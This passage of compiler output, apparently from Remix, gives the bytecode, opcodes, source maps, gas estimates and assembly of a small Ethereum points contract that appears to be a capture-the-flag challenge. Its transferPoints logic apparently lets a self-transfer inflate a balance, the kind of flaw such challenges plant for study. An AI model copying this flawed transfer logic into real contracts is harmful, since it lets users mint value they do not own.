0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19C PUSH2 0x37A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B3 PUSH2 0x3EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1E2 PUSH2 0x44D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F9 PUSH2 0x584 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP2 POP PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP3 DUP3 GT ISZERO ISZERO PUSH2 0x2A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP4 DUP3 ADD GT ISZERO ISZERO PUSH2 0x2B2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP3 SUB PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP3 DUP2 ADD PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x64 PUSH1 0x2 SLOAD LT ISZERO ISZERO PUSH2 0x38B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x2 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO PUSH2 0x446 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x3E7 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO ISZERO ISZERO PUSH2 0x52B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536F7272792C20796F7520646F6E2774206861766520656E6F75676820706F69 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6E74730000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xe8 STATICCALL REVERT DUP15 COINBASE 0xbe TIMESTAMP SELFDESTRUCT RETURNDATASIZE SAR SELFDESTRUCT CALLER PUSH27 0x93CCE2CBD8709BF3FD67419CA36783A238B7130029000000000000 ",
							"sourceMap": "28:919:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;28:919:0;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063326f823f14610088578063358b8166146100d55780634095da721461012c5780635bea9faa14610187578063b2fa1c9e1461019e578063db78cdad146101cd578063fab1512e146101e4575b600080fd5b34801561009457600080fd5b506100d3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061020f565b005b3480156100e157600080fd5b50610116600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610342565b6040518082815260200191505060405180910390f35b34801561013857600080fd5b5061016d600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035a565b604051808215151515815260200191505060405180910390f35b34801561019357600080fd5b5061019c61037a565b005b3480156101aa57600080fd5b506101b36103ec565b604051808215151515815260200191505060405180910390f35b3480156101d957600080fd5b506101e261044d565b005b3480156101f057600080fd5b506101f9610584565b6040518082815260200191505060405180910390f35b6000806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205491506000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905082821115156102a257600080fd5b828382011115156102b257600080fd5b8282036000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508281016000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050505050565b60006020528060005260406000206000915090505481565b60016020528060005260406000206000915054906101000a900460ff1681565b606460025410151561038b57600080fd5b60016000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550600260008154809291906001019190505550565b6000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151561044657600080fd5b6001905090565b6103e76000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561052b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001807f536f7272792c20796f7520646f6e2774206861766520656e6f75676820706f6981526020017f6e7473000000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b60018060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550565b600254815600a165627a7a72305820e8fafd8e41be42ff3d1dff337a93cce2cbd8709bf3fd67419ca36783a238b7130029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x326F823F EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0x358B8166 EQ PUSH2 0xD5 JUMPI DUP1 PUSH4 0x4095DA72 EQ PUSH2 0x12C JUMPI DUP1 PUSH4 0x5BEA9FAA EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0xB2FA1C9E EQ PUSH2 0x19E JUMPI DUP1 PUSH4 0xDB78CDAD EQ PUSH2 0x1CD JUMPI DUP1 PUSH4 0xFAB1512E EQ PUSH2 0x1E4 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD3 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x20F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x342 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x138 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x35A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x193 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19C PUSH2 0x37A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B3 PUSH2 0x3EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1E2 PUSH2 0x44D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F9 PUSH2 0x584 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP2 POP PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP3 DUP3 GT ISZERO ISZERO PUSH2 0x2A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP4 DUP3 ADD GT ISZERO ISZERO PUSH2 0x2B2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP3 SUB PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP3 DUP2 ADD PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x64 PUSH1 0x2 SLOAD LT ISZERO ISZERO PUSH2 0x38B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x2 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO PUSH2 0x446 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x3E7 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO ISZERO ISZERO PUSH2 0x52B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536F7272792C20796F7520646F6E2774206861766520656E6F75676820706F69 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6E74730000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xe8 STATICCALL REVERT DUP15 COINBASE 0xbe TIMESTAMP SELFDESTRUCT RETURNDATASIZE SAR SELFDESTRUCT CALLER PUSH27 0x93CCE2CBD8709BF3FD67419CA36783A238B7130029000000000000 ",
							"sourceMap": "28:919:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;485:328;;8:9:-1;5:2;;;30:1;27;20:12;5:2;485:328:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;49:38;;8:9:-1;5:2;;;30:1;27;20:12;5:2;49:38:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;94:42;;8:9:-1;5:2;;;30:1;27;20:12;5:2;94:42:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;348:125;;8:9:-1;5:2;;;30:1;27;20:12;5:2;348:125:0;;;;;;821:121;;8:9:-1;5:2;;;30:1;27;20:12;5:2;821:121:0;;;;;;;;;;;;;;;;;;;;;;;;;;;176:164;;8:9:-1;5:2;;;30:1;27;20:12;5:2;176:164:0;;;;;;143:24;;8:9:-1;5:2;;;30:1;27;20:12;5:2;143:24:0;;;;;;;;;;;;;;;;;;;;;;;485:328;555:18;605:14;576:6;:18;583:10;576:18;;;;;;;;;;;;;;;;555:39;;622:6;:10;629:2;622:10;;;;;;;;;;;;;;;;605:27;;664:6;651:10;:19;643:28;;;;;;;;708:6;699;690;:15;:24;682:33;;;;;;;;760:6;747:10;:19;726:6;:18;733:10;726:18;;;;;;;;;;;;;;;:40;;;;799:6;790;:15;777:6;:10;784:2;777:10;;;;;;;;;;;;;;;:28;;;;485:328;;;;:::o;49:38::-;;;;;;;;;;;;;;;;;:::o;94:42::-;;;;;;;;;;;;;;;;;;;;;;:::o;348:125::-;405:3;393:9;;:15;385:24;;;;;;;;442:1;420:6;:18;427:10;420:18;;;;;;;;;;;;;;;;:23;;;;;;;;;;;454:9;;:11;;;;;;;;;;;;;348:125::o;821:121::-;864:4;889:10;:22;900:10;889:22;;;;;;;;;;;;;;;;;;;;;;;;;881:31;;;;;;;;930:4;923:11;;821:121;:::o;176:164::-;249:3;227:6;:18;234:10;227:18;;;;;;;;;;;;;;;;:25;;219:73;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;328:4;303:10;:22;314:10;303:22;;;;;;;;;;;;;;;;:29;;;;;;;;;;;;;;;;;;176:164::o;143:24::-;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "292400",
								"executionCost": "331",
								"totalCost": "292731"
							},
							"external": {
								"getPoint()": "40987",
								"isComplete()": "650",
								"isSuperVip(address)": "613",
								"numOfFree()": "526",
								"points(address)": "554",
								"promotionSVip()": "20920",
								"transferPoints(address,uint256)": "41114"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 28,
									"end": 947,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "MSTORE"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "POP"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "DUP1"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "CODECOPY"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 28,
									"end": 947,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a72305820e8fafd8e41be42ff3d1dff337a93cce2cbd8709bf3fd67419ca36783a238b7130029",
									".code": [
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "MSTORE"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "LT"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "SWAP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DIV"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "AND"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "326F823F"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "358B8166"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "4095DA72"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "5BEA9FAA"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "B2FA1C9E"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "DB78CDAD"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "FAB1512E"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "EQ"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPI"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "JUMPDEST"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "DUP1"
										},
										{
											"begin": 28,
											"end": 947,
											"name": "REVERT"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "JUMPDEST"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
